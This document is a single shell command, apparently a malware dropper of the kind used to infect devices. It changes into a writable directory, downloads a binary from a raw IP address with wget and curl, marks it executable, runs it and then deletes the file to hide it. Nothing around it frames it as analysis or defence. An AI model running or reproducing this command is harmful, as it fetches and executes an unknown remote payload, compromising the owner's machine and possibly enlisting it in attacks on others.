cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.231.134/tftp; curl -O http://80.211.231.134/tftp; chmod +x tftp; ./tftp; rm -rf tftp
